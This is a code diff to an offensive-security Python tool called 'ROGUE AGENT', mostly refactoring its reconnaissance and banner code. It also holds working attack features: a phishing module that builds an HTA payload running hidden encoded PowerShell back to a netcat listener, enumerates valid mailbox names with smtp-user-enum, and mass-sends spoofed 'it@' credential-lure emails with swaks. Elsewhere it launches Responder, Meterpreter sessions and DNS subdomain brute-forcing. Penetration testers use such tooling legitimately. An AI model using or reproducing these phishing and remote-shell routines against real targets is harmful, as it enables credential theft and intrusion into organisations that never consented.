@@ -279,21 +279,41 @@ def checkInterface(variable, COM):
          NetworkAddr = binding['aNetworkAddr']                  
          if checkParams == 0:
             if "." not in NetworkAddr:
-               print("[+] Found interface...\n")
+               print("[+] Found network interface...\n")
                COM = NetworkAddr
                COM = COM.replace(chr(0), '')
                checkParams = 1               
          print(colored("Address: " + NetworkAddr, colour6))   
                
    except:
-      print("[-] No responce from network interface, checking connection instead...\n")
+      print("[-] No responce from network interface, checking connection instead...")
       COM = spacePadding("UNKNOWN", COL0)      
       if variable == "DNS":
-           remCommand("ping -c 5 " + DNS.rstrip(" "))
+           remCommand("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
       if variable == "TIP":
-           remCommand("ping -c 5 " + TIP.rstrip(" "))
+           remCommand("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")
+           
+      localCommand("sed -i '/PING/d' ./ping.tmp")
+      localCommand("sed -i '$d' ./ping.tmp")
+      localCommand("echo '" + Green + "'")
+      localCommand("cat ping.tmp")
+      localCommand("echo '" + Reset + "'")
    COM = spacePadding(COM, COL0)
    return COM       
+   
+def checkBIOS():
+   print(colored("[*] Checking windows network neighborhood protocol...", colour3))
+   remCommand("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
+   localCommand("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
+   localCommand("sed -i '/^$/d' ./bios.tmp")
+   nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
+   if nullTest == "":
+      print("[-] No netbios information found...")
+   else:
+      localCommand("echo '" + Green + "'")
+      localCommand("cat bios.tmp")
+      localCommand("echo '" + Reset + "'")
+   return
 
 def keys():
    print("\tHKEY_CLASSES_ROOT   HKCR")
@@ -368,11 +388,12 @@ def fileCheck(variable):
       print("[!] Checked file " + variable + " contains data...")
    return
    
-def banner(variable):
-   localCommand("clear")
-   ascii_banner = pyfiglet.figlet_format(variable)
+def banner(variable,flash):
+   ascii_banner = pyfiglet.figlet_format(variable).upper()
    ascii_banner = ascii_banner.rstrip("\n")
-   print(colored(ascii_banner,colour0, attrs=['bold']))
+   if flash == 1:
+      localCommand("clear")
+      print(colored(ascii_banner,colour0, attrs=['bold']))
    localCommand("pyfiglet " + variable + " > banner.tmp")
    return
 
@@ -723,7 +744,7 @@ else:
 # -------------------------------------------------------------------------------------
 
 localCommand("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
-banner("ROGUE  AGENT")
+banner("ROGUE  AGENT",1)
 print(colored("\t\tT R E A D S T O N E  E D I T I O N",colour7,attrs=['bold']))
 print(colored("\n\n[*] Booting, please wait...", colour3))
 print("[+] Using localhost IP address " + localIP + "...")
@@ -1126,40 +1147,48 @@ while True:
 
    if selection =='2':
       BAK = TIP
-      TIP = input("[?] Please enter remote IP address: ")
+      TIP = input("[?] Please enter remote IP address: ").upper()
+      TIP = spacePadding(TIP, COL1)
       
-      if TIP == "":
+      if TIP[:1] == " ":
          TIP = BAK
+         
+      if TIP[:5] == "EMPTY":
+         print("[+] Remote IP address reset...")
       else:
-         TIP = spacePadding(TIP, COL1)
+         checkParams = 0
+         count = TIP.count(':')
             
-         if TIP[:5] != "EMPTY":
-            count = TIP.count(':')
-            
-            if count > 1:
-               print("[+] Defualting to IP 6...")
+         if count == 7:
+            try:
+               bit1,bit2,bit3,bit4,bit5,bit6,bit7,bit8 = TIP.split(":")
+               print("[+] Defualting to internet protocol 6...")
                IP46 = "-6"
-            else:
-               print("[+] Defaulting to IP 4...")
-               IP46 = "-4"                 
+               checkParams = 1
+            except:
+               print("[-] Unknown internet protocol...")
+               TIP = spacePadding("EMPTY", COL1)               
+               
+         count = TIP.count(".")
          
-            COM = checkInterface("TIP", COM)
-         
-            print(colored("\n[*] Checking NETBIOS information...", colour3))
-            remCommand("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
+         if count == 3:
+            try:
+               bit1,bit2,bit3,bit4 = TIP.split(".")
+               print("[+] Defaulting to internet protocol 4...")
+               IP46 = "-4"
+               checkParams = 1
+            except:
+               print("[-] Unknown internet protocol...")
+               TIP = spacePadding("EMPTY", COL1)               
                   
-            localCommand("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
-            localCommand("sed -i '/^$/d' ./bios.tmp")
-            nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
-         
-            if nullTest == "":
-               print("[-] No bios information was found...")
-            else:
-               localCommand("echo '" + Green + "'")
-               localCommand("cat bios.tmp")
-               localCommand("echo '" + Reset + "'")
-                              
-         prompt()
+         if checkParams == 1:
+            COM = checkInterface("TIP", COM)
+            checkBIOS()
+         else:
+            print("[-] Unknown internet protocol...")
+            TIP = spacePadding("EMPTY", COL1)           
+                   
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
@@ -1455,7 +1484,7 @@ while True:
       if HTTP != 1:
          localCommand("xdotool key Ctrl+Shift+T")
          localCommand("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-         banner("HTTP SERVER") 
+         banner("HTTP SERVER",0) 
          localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          localCommand("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
          localCommand("xdotool key Ctrl+Tab")
@@ -1471,7 +1500,7 @@ while True:
    if selection == '14':
       localCommand("xdotool key Ctrl+Shift+T")
       localCommand("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
-      banner("SMB SERVER") 
+      banner("SMB SERVER",0) 
       localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCommand("xdotool type 'impacket-smbserver " + httpDir + " ./" + httpDir + " -smb2support'; xdotool key Return")
       localCommand("xdotool key Ctrl+Tab")
@@ -1487,7 +1516,7 @@ while True:
    if selection == '15':
       localCommand("xdotool key Ctrl+Shift+T")
       localCommand("xdotool key Alt+Shift+S; xdotool type 'RESPONDER'; xdotool key Return")
-      banner("RESPONDER") 
+      banner("RESPONDER",0) 
       localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCommand("xdotool type 'responder -I " + netWork + " -v'; xdotool key Return")
       localCommand("xdotool key Ctrl+Tab")
@@ -1562,12 +1591,6 @@ while True:
          print(colored("[*] Bruteforcing DOMAIN name, please wait this can take sometime...", colour3))
          remCommand("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")
 
-#         print(colored("[*] Checking DOMAIN ranges, please wait this can take sometime...", colour3))
-#         if IP46 == "-4":
-#            bit1,bit2,bit3,bit3 = TIP.split(".")
-#            remCommand("dnsrecon -n " + TIP.rstrip(" ") + " -r " + bit1 + ".0.0.0/8 -d " + DOM.rstrip(" "))
-#         remCommand("dnsrecon -n " + TIP.rstrip(" ") + " -r 172.16.0.0/12 -d "  + DOM.rstrip(" "))
-#         remCommand("dnsrecon -n " + TIP.rstrip(" ") + " -r 192.168.0.0/16 -d " + DOM.rstrip(" "))
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -3230,13 +3253,15 @@ while True:
          checkParams = 1      
          
       if checkParams != 1:    
-         print(colored("[*] Starting phishing server...", colour3))      
+         print(colored("[*] Starting phishing server...", colour3))    
+           
          localCommand("xdotool key Ctrl+Shift+T")
          localCommand("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-         banner("BANNER5")
+         banner("GONE PHISHING",0)
          localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          localCommand("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
-         localCommand("xdotool key Ctrl+Tab")            
+         localCommand("xdotool key Ctrl+Tab")         
+            
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
          a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
@@ -3280,18 +3305,19 @@ while True:
             localCommand('echo "\nRegards," >> body.tmp')
             localCommand('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                  
             print(colored("[*] Created phishing email...\n", colour3))
-            print(colored("Subject: Credentials/Errors\n", colour3))         
          
-            with open("body.tmp", "r") as list:
-               for phish in list:
-                  phish = phish.rstrip("\n")
-                  print(colored(phish,colour3))
-               print("")            
-            print(colored("[*] Checking for valid usernames, please wait...", colour3))         
-            remCommand("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
+            print(colored("Subject: Credentials/Errors", colour6))         
+            localCommand("echo '" + Green + "'")
+            localCommand("cat body.tmp")
+            localCommand("echo '" + Reset + "'")
+                      
+            print(colored("[*] Checking for valid usernames, please wait...", colour3))
+            
+            remCommand("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m VRFY " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
             localCommand("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")         
          
             match = 0                           
+            
             with open("valid.tmp", "r") as list:			# PARSE FILE
                for line in list:
                   line.encode('ascii',errors='ignore')
@@ -3305,36 +3331,28 @@ while True:
                   
                   if "TEST" not in line:                  
                      localCommand("echo " + line + " >> phish.tmp")
-                     match = 1                  
+                     print(colored(line + "@" + DOM.rstrip(" "),colour6))
+                     match = 1   
                      
-            if match == 1: 						# SHOW FOUND PHISH
-                print("[+] Found valid email addresses...\n")
-                with open("phish.tmp", "r") as list:
-                   for line in list:
-                      line = line.rstrip("\n")
-                      print(colored(line + "@" + DOM.rstrip(" "),colour6))         
-                      
-            print(colored("[*] Starting phishing server...", colour3))                   
-            localCommand("xdotool key Ctrl+Shift+T")
-            localCommand("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-            banner("BANNER5")
-            localCommand("xdotool type 'clear; cat banner5.tmp'; xdotool key Return")
-            localCommand("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
-            localCommand("xdotool key Ctrl+Tab")                  
-            
             if match == 0:
-               print("[-] Phish not found, phishing the list anyway..")
-               
-               with open(dataDir + "/usernames.txt", "r") as list:
-                  for phish in list:
-                     phish = phish.rstrip("\n")
-                     phish = phish.strip(" ")
-                     phish = phish + "@"
-                     phish = phish + DOM.rstrip(" ")
-                     remCommand("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                     print("[+] Mail sent to " + phish + "...")
-            else:
-               print("[-] No valid email addresses where found...")                               
+               print("[-] Phish not found, phishing the list anyway..")       
+                      
+            print(colored("[*] Starting phishing server...", colour3))            
+            banner("GONE PHISHING",0)               
+            localCommand("xdotool key Ctrl+Shift+T")
+            localCommand("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")            
+            localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")            
+            localCommand("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")            
+            localCommand("xdotool key Ctrl+Tab")
+            
+            with open(dataDir + "/usernames.txt", "r") as list:
+               for phish in list:
+                  phish = phish.rstrip("\n")
+                  phish = phish.strip(" ")
+                  phish = phish + "@"
+                  phish = phish + DOM.rstrip(" ")
+                  remCommand("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                  print("[+] Mail sent to " + phish + "...")                              
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3706,7 +3724,7 @@ while True:
             
          localCommand("xdotool key Ctrl+Shift+T")
          localCommand("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
-         banner("METERPRETER") 
+         banner("METERPRETER",0) 
          localCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          localCommand("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          localCommand("xdotool key Ctrl+Tab")
@@ -3735,7 +3753,7 @@ while True:
             
          localCommand("xdotool key Ctrl+Shift+T")
          localCommand("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
-         banner("METERPRETER") 
+         banner("METERPRETER",0) 
          localCommand("xdotool type 'cat banner.tmp'; xdotool key Return")
          localCommand("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          localCommand("xdotool key Ctrl+Tab")
@@ -3762,7 +3780,7 @@ while True:
 
          localCommand("xdotool key Ctrl+Shift+T")
          localCommand("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
-         banner("METERPRETER")
+         banner("METERPRETER",0)
          localCommand("xdotool type 'cat banner.tmp'; xdotool key Return")
          localCommand("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          localCommand("xdotool key Ctrl+Tab")
